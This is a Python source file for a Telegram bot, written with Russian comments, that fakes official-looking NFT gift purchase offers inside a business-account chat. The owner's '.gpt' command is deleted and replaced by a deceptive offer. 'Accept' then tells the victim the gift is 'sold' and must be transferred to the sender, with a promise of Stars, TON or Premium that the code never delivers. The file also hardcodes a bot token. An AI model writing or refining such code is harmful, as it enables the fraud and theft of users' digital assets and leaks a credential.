import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, LinkPreviewOptions
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# --- НАСТРОЙКИ ---
BOT_TOKEN = "9132697740:AAGGGbDTSFBT8Q8zdQRjwqUJGm0bDClmnv8"

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dispatcher = Dispatcher()

last_offer_data = {}
last_message_id = None

# ID премиум-эмодзи
STAR_EMOJI_ID = "5323333018151045958"
CHECK_EMOJI_ID = "5774022692642492953"
CROSS_EMOJI_ID = "5778527486270770928"
ENVELOPE_EMOJI_ID = "6019263620142078168"
TON_EMOJI_ID = "5318901904686754959"

STAR_EMOJI = f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐</tg-emoji>'
TON_EMOJI = f'<tg-emoji emoji-id="{TON_EMOJI_ID}">💎</tg-emoji>'

async def safe_delete(chat_id, message_id, conn_id=None):
    if conn_id:
        try:
            await bot.delete_business_messages(
                business_connection_id=conn_id,
                message_ids=[message_id]
            )
            return
        except Exception:
            pass
    try:
        await bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception:
        pass

# --- ОБРАБОТЧИК КОМАНДЫ .gpt ---
@dispatcher.business_message(F.text.startswith(".gpt"))
async def send_offer(message: Message):
    global last_offer_data, last_message_id
    
    # Берем conn_id прямо из сообщения, где ты написал команду
    conn_id = message.business_connection_id
    if not conn_id:
        return

    try:
        connection = await bot.get_business_connection(conn_id)
        owner_id = connection.user.id
    except Exception:
        return

    if message.from_user.id != owner_id:
        return

    parts = message.text.split()
    
    if len(parts) < 4:
        return

    links = [p for p in parts[1:] if p.startswith("http") or p.startswith("t.me")]
    
    if len(links) == 0:
        return
    elif len(links) == 1:
        nft_count = 1
        link1 = links[0]
        link2 = None
        amount = parts[2]
        currency_raw = parts[3].lower()
        lang = parts[4].lower() if len(parts) > 4 else "ru"
    elif len(links) >= 2:
        nft_count = 2
        link1 = links[0]
        link2 = links[1]
        remaining = [p for p in parts[1:] if p not in links]
        if len(remaining) < 2:
            return
        amount = remaining[0]
        currency_raw = remaining[1].lower()
        lang = remaining[2].lower() if len(remaining) > 2 else "ru"
    else:
        return

    if not link1.startswith("http"):
        link1 = "https://" + link1
    if link2 and not link2.startswith("http"):
        link2 = "https://" + link2

    if currency_raw not in ["stars", "ton", "gram", "premium", "prem"]:
        return

    if lang not in ["ru", "en"]:
        lang = "ru"

    is_premium = currency_raw in ["premium", "prem"]

    if is_premium:
        amount_text = "Telegram Premium на 3 месяца" if lang == "ru" else "Telegram Premium for 3 months"
        action_word_ru = "будет активирован"
        action_word_en = "will be activated"
    else:
        if currency_raw == "stars":
            currency_display = STAR_EMOJI
        elif currency_raw == "ton":
            currency_display = TON_EMOJI
        else:
            currency_display = "Gram"
        amount_text = f"{amount} {currency_display}"
        action_word_ru = "будут зачислены"
        action_word_en = "will be credited"

    nft1_slug = link1.rstrip("/").split("/")[-1]
    nft1_prefix, separator, nft1_number = nft1_slug.rpartition("-")
    nft1_name = f"{nft1_prefix} #{nft1_number}" if separator and nft1_number.isdigit() else nft1_slug
    nft1_link = f'<a href="{link1}">{nft1_name}</a>'
    
    nft2_link = ""
    if link2:
        nft2_slug = link2.rstrip("/").split("/")[-1]
        nft2_prefix, sep2, nft2_number = nft2_slug.rpartition("-")
        nft2_name = f"{nft2_prefix} #{nft2_number}" if sep2 and nft2_number.isdigit() else nft2_slug
        nft2_link = f'<a href="{link2}">{nft2_name}</a>'

    sender_name = message.from_user.first_name

    if nft_count == 1:
        if lang == "ru":
            offer_text = f"<b>{sender_name} предлагает Вам {amount_text} за коллекционный предмет {nft1_link}.</b>\n\n<i>Действует 5ч 59м.</i>"
        else:
            offer_text = f"<b>{sender_name} offers you {amount_text} for the collectible {nft1_link}.</b>\n\n<i>Expires in 5h 59m.</i>"
    else:
        if lang == "ru":
            offer_text = (
                f"<b>{sender_name} предлагает Вам {amount_text} за коллекцию из двух коллекционных предметов:</b>\n"
                f"1. {nft1_link}\n"
                f"2. {nft2_link}\n\n"
                f"<i>Действует 5ч 59м.</i>"
            )
        else:
            offer_text = (
                f"<b>{sender_name} offers you {amount_text} for a collection of two collectibles:</b>\n"
                f"1. {nft1_link}\n"
                f"2. {nft2_link}\n\n"
                f"<i>Expires in 5h 59m.</i>"
            )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="Отклонить" if lang == "ru" else "Decline", callback_data="decline", icon_custom_emoji_id=CROSS_EMOJI_ID),
        InlineKeyboardButton(text="Принять" if lang == "ru" else "Accept", callback_data="accept_offer", icon_custom_emoji_id=CHECK_EMOJI_ID)
    ]])

    last_offer_data = {
        "nft_name": nft1_name if nft_count == 1 else "Два предмета",
        "amount_text": amount_text,
        "link": link1,
        "link2": link2,
        "sender_username": message.from_user.username,
        "lang": lang,
        "business_connection_id": conn_id,
        "is_premium": is_premium,
        "action_word_ru": action_word_ru,
        "action_word_en": action_word_en
    }

    if last_message_id:
        await safe_delete(message.chat.id, last_message_id, conn_id)

    try:
        # Отправляем СТРОГО в тот чат, где ты написал команду
        msg = await bot.send_message(
            chat_id=message.chat.id,
            text=offer_text,
            reply_markup=keyboard,
            business_connection_id=conn_id,
            link_preview_options=LinkPreviewOptions(url=link1, is_disabled=False, prefer_large_media=True, show_above_text=True)
        )
        last_message_id = msg.message_id
        await safe_delete(message.chat.id, message.message_id, conn_id)
    except Exception as e:
        print(f"Ошибка отправки оффера: {e}")

# --- ОБРАБОТЧИК "ПРИНЯТЬ" ---
@dispatcher.callback_query(F.data == "accept_offer")
async def on_accept_offer(callback: CallbackQuery):
    global last_message_id
    
    # Жестко берем conn_id из данных, чтобы не потерять
    conn_id = last_offer_data.get("business_connection_id")
    if not conn_id:
        return await callback.answer("Ошибка: контекст чата потерян.", show_alert=True)

    nft_name = last_offer_data.get("nft_name", "NFT")
    amount_text = last_offer_data.get("amount_text", "")
    link = last_offer_data.get("link", "")
    link2 = last_offer_data.get("link2")
    sender_username = last_offer_data.get("sender_username")
    lang = last_offer_data.get("lang", "ru")
    action_word_ru = last_offer_data.get("action_word_ru", "будут зачислены")
    action_word_en = last_offer_data.get("action_word_en", "will be credited")

    target_account = f"@{sender_username}" if sender_username else "покупателю"

    if link2:
        if lang == "ru":
            new_text = (
                f"<b>• Передайте оба предмета покупателю {target_account} для завершения сделки.</b>\n\n"
                f"<b>После передачи подарков, {amount_text} {action_word_ru} на ваш аккаунт.</b>"
            )
            btn_transfer = "Передать"
            btn_how = "Как передать?"
        else:
            new_text = (
                f"<b>• Transfer both items to {target_account} to complete the deal.</b>\n\n"
                f"<b>After transferring the gifts, {amount_text} {action_word_en} to your account.</b>"
            )
            btn_transfer = "Transfer"
            btn_how = "How to transfer?"
    else:
        nft_link = f'<a href="{link}">{nft_name}</a>'
        if lang == "ru":
            new_text = (
                f"<b>Подарок успешно продан {nft_link}.</b>\n\n"
                f"<b>• Передайте подарок {target_account} для завершения сделки.</b>\n\n"
                f"<b>После передачи подарка, {amount_text} {action_word_ru} на ваш аккаунт.</b>"
            )
            btn_transfer = "Передать"
            btn_how = "Как передать?"
        else:
            new_text = (
                f"<b>Gift {nft_link} successfully sold.</b>\n\n"
                f"<b>• Transfer the gift to {target_account} to complete the deal.</b>\n\n"
                f"<b>After transferring the gift, {amount_text} {action_word_en} to your account.</b>"
            )
            btn_transfer = "Transfer"
            btn_how = "How to transfer?"

    new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=btn_transfer, url="tg://settings/my-profile/gifts", icon_custom_emoji_id=ENVELOPE_EMOJI_ID)],
        [InlineKeyboardButton(text=btn_how, callback_data="send_transfer")]
    ])

    await safe_delete(callback.message.chat.id, callback.message.message_id, conn_id)
    if last_message_id and last_message_id != callback.message.message_id:
        await safe_delete(callback.message.chat.id, last_message_id, conn_id)

    try:
        # Отправляем строго в тот же чат
        msg = await bot.send_message(
            chat_id=callback.message.chat.id, 
            text=new_text, 
            reply_markup=new_keyboard, 
            business_connection_id=conn_id,
            link_preview_options=LinkPreviewOptions(url=link, is_disabled=False, prefer_large_media=True, show_above_text=True)
        )
        last_message_id = msg.message_id
    except Exception as e:
        print(f"Ошибка отправки: {e}")
    await callback.answer()

# --- ОСТАЛЬНЫЕ ОБРАБОТЧИКИ ---
@dispatcher.callback_query(F.data == "send_transfer")
async def on_send_transfer(callback: CallbackQuery):
    sender_username = last_offer_data.get("sender_username")
    lang = last_offer_data.get("lang", "ru")
    target_account = f"@{sender_username}" if sender_username else "покупателю"
    alert_text = f"1. Нажмите «Передать» под сообщением.\n2. Перейдите в «Мои подарки» и выберите NFT.\n3. Нажмите «Передать», выберите получателя и передайте подарок.\n\nНет в контактах? Найдите по {target_account}" if lang == "ru" else f"1. Click «Transfer» under the message.\n2. Go to «My Gifts» and select the NFT.\n3. Click «Transfer», choose the recipient and transfer the gift.\n\nNot in contacts? Find by {target_account}"
    await callback.answer(alert_text, show_alert=True)

@dispatcher.callback_query(F.data == "decline")
async def on_decline(callback: CallbackQuery):
    lang = last_offer_data.get("lang", "ru")
    conn_id = last_offer_data.get("business_connection_id")
    await safe_delete(callback.message.chat.id, callback.message.message_id, conn_id)
    await callback.answer("Вы отклонили предложение." if lang == "ru" else "You have declined the offer.", show_alert=True)

async def main():
    print("Бот запущен.")
    await dispatcher.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
